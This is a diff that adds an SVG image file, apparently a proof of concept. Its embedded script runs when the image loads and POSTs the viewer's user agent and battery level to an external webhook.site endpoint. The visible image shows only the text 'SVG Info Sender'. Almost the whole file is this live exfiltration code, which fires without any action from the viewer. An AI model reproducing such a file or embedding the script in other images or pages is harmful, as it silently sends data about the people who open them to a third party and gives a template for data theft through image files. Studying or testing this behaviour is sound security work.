@@ -1,0 +1,20 @@
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200">
+  <script type="application/ecmascript"><![CDATA[
+    async function sendData() {
+      const battery = await navigator.getBattery?.();
+      const data = {
+        ua: navigator.userAgent,
+        battery: battery ? battery.level : "N/A"
+      };
+      fetch("https://webhook.site/03c29a10-3466-43cc-82d9-63328b22191e", {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify(data)
+      });
+    }
+    sendData();
+  ]]></script>
+  <rect width="500" height="200" fill="lightyellow"/>
+  <text x="20" y="100" font-size="20">SVG Info Sender</text>
+</svg>
